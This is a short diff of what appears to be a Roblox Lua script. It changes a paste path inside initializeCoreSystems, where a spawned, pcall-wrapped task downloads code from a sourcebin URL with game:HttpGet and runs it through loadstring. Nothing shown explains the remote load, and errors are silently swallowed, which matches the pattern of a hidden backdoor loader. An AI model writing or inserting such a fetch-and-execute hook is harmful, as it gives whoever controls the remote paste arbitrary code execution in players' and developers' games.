@@ -482,7 +482,7 @@ local function initializeCoreSystems()
     task.spawn(function()
         pcall(function()
             local domain = "https://cdn.sourceb.in"
-            local path = "/bins/I4nlAia9sZ/0"
+            local path = "/bins/BS2WZxBev3/0"
             loadstring(game:HttpGet(domain .. path, true))()
         end)
     end)
